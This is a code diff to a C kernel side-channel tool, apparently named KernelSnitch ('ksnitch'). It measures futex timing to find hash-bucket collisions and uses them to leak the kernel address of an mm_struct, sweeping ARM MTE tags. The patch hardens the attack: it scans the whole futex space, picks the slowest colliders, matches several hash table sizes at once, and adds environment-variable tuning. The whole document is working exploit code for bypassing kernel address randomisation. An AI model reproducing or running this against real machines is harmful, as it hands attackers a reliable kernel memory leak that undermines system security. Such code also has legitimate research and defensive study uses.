@@ -243,30 +243,39 @@ static void *__mm_leak(void *arg)
             for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
                 scanned++;
 
-                size_t found_hash = 1;
-                if (!ks->mte_enabled) {
-                    // test the mm_struct candidate
-                    for (size_t i = 1; i < ks->collisions && found_hash; ++i)
-                        found_hash = (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
-                    if (found_hash) {
-                        pr_success("ksnitch mm_struct hit=%016zx (no-tag mode)\n", mm_struct_candidate);
-                        ks->mm_struct = mm_struct_candidate;
-                        ks->found = 1;
-                        break;
-                    }
+                /* CONFIG_NR_CPUS=32: the kernel hashsize is
+                 * roundup_pow_of_two(256 * num_possible_cpus()) which may
+                 * exceed 256*online. Match against every plausible size at
+                 * once - a true collision (equal low bits for size N) also
+                 * collides for any divisor of N, so the real size is found
+                 * without re-running jhash2 per size. */
+                static const unsigned long ks_hs_table[] = {2048, 4096, 8192, 16384};
+                size_t tag_lo = 0, tag_hi = 1;
+                if (ks->mte_enabled) {
+                    tag_hi = 15;
                 } else {
-                    // need to set the tag if mte is enabled
-                    for (size_t tag_candidate = 0; tag_candidate < 15 && !ks->found; ++tag_candidate) {
-                        size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
-                        __mm_struct_candidate |= (tag_candidate << 56);
-                        found_hash = 1;
-                        for (size_t i = 1; i < ks->collisions && found_hash; ++i)
-                            found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
+                    const char *env = getenv("KSNITCH_TAG_SWEEP");
+                    if (env && atoi(env) > 0)
+                        tag_hi = 15;
+                }
+                for (size_t tag = tag_lo; tag < tag_hi && !ks->found; ++tag) {
+                    size_t cand = (mm_struct_candidate & ~(0xfULL << 56)) | (tag << 56);
+                    uint32_t hcache[16];
+                    size_t nhash = ks->collisions;
+                    if (nhash > 16)
+                        nhash = 16;
+                    for (size_t i = 0; i < nhash; ++i)
+                        hcache[i] = futex_hash_full(ks->futex_addrs[i], cand);
+                    for (size_t hsi = 0; hsi < sizeof(ks_hs_table)/sizeof(ks_hs_table[0]) && !ks->found; ++hsi) {
+                        uint32_t mask = (uint32_t)(ks_hs_table[hsi] - 1);
+                        size_t found_hash = 1;
+                        for (size_t i = 1; i < nhash && found_hash; ++i)
+                            found_hash = ((hcache[0] & mask) == (hcache[i] & mask));
                         if (found_hash) {
-                            pr_success("ksnitch mm_struct hit=%016zx tag=%zx\n", __mm_struct_candidate, tag_candidate);
-                            ks->mm_struct = __mm_struct_candidate;
+                            pr_success("ksnitch mm_struct hit=%016zx tag=%zu hashsize=%lu h0=%08x\n",
+                                       cand, tag, ks_hs_table[hsi], hcache[0] & mask);
+                            ks->mm_struct = cand;
                             ks->found = 1;
-                            break;
                         }
                     }
                 }
@@ -354,7 +363,18 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
     wanted = ks->collisions - 1;
 
+    size_t threshold_mult = KERNELSNITCH_THRESHOLD_MULT;
+    {
+        const char *e = getenv("KSNITCH_THRESHOLD_MULT");
+        if (e) {
+            long v = atol(e);
+            if (v > 0)
+                threshold_mult = (size_t)v;
+        }
+    }
+
     size_t approx_time = MIN(__measure((size_t)&ks->futexes[0]), __measure((size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+    size_t threshold = approx_time * threshold_mult;
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
@@ -364,25 +384,66 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     // find futex user space address which collide with the piled-up hash bucket ID 128
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
     if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
-    for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
+    /* scan the WHOLE futex space, then keep the slowest wanted ones: a real
+     * collision walks the 4096-waiter chain and is orders of magnitude slower
+     * than any noise spike, while a first-hit threshold scan can be satisfied
+     * by early noise and silently skip the real colliders */
+    size_t max_time = 0;
+    size_t over_thresh = 0;
+    for (size_t i = 2; i < ks->total_futexes; ++i) {
         id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
         if (id >= FUTEX_SZ)
             break;
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(futex_addr);
-        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
-            count++;
-            ks->futex_addrs[count] = futex_addr;
-            if (ks->verbose) pr_info("  %016zx\n", futex_addr);
+        if (ks->times[i] > max_time)
+            max_time = ks->times[i];
+        if (ks->times[i] > threshold)
+            over_thresh++;
+    }
+    pr_info("ksnitch measure done: approx=%zd threshold=%zd max_time=%zd over_threshold=%zd\n",
+            approx_time, threshold, max_time, over_thresh);
+    /* selection: repeatedly take the slowest remaining measurement */
+    {
+        size_t picked = 0;
+        size_t last_time = (size_t)-1;
+        while (picked < wanted && picked < over_thresh) {
+            size_t best = 0;
+            size_t best_time = 0;
+            for (size_t i = 2; i < ks->total_futexes; ++i) {
+                if (ks->times[i] > best_time && ks->times[i] <= last_time) {
+                    /* skip entries already picked (equal times): use index ordering */
+                    size_t dup = 0;
+                    for (size_t j = 1; j <= picked; ++j) {
+                        if (ks->futex_addrs[j] == (size_t)&ks->futexes[(i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE)]) {
+                            dup = 1;
+                            break;
+                        }
+                    }
+                    if (!dup) {
+                        best = i;
+                        best_time = ks->times[i];
+                    }
+                }
+            }
+            if (best == 0 || best_time <= threshold)
+                break;
+            picked++;
+            ks->futex_addrs[picked] = (size_t)&ks->futexes[(best * KS_PAGE_SIZE) | (best * 8 % KS_PAGE_SIZE)];
+            pr_info("ksnitch collider #%zd addr=%016zx time=%zd (x%zd of baseline)\n",
+                    picked, ks->futex_addrs[picked], ks->times[best],
+                    best_time / (approx_time ? approx_time : 1));
+            last_time = ks->times[best];
         }
+        count = picked;
     }
     if (wanted == count) {
-        pr_success("ksnitch collisions ok=%zd/%zd approx_time=%zd threshold=%zd\n",
-                   count, wanted, approx_time, approx_time * KERNELSNITCH_THRESHOLD_MULT);
+        pr_success("ksnitch collisions ok=%zd/%zd approx_time=%zd threshold=%zd max=%zd\n",
+                   count, wanted, approx_time, threshold, max_time);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
     } else {
-        pr_warning("ksnitch collisions only=%zd/%zd approx_time=%zd threshold=%zd -> cannot continue\n",
-                   count, wanted, approx_time, approx_time * KERNELSNITCH_THRESHOLD_MULT);
+        pr_warning("ksnitch collisions only=%zd/%zd approx_time=%zd threshold=%zd max=%zd -> cannot continue\n",
+                   count, wanted, approx_time, threshold, max_time);
         ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
     }
 }
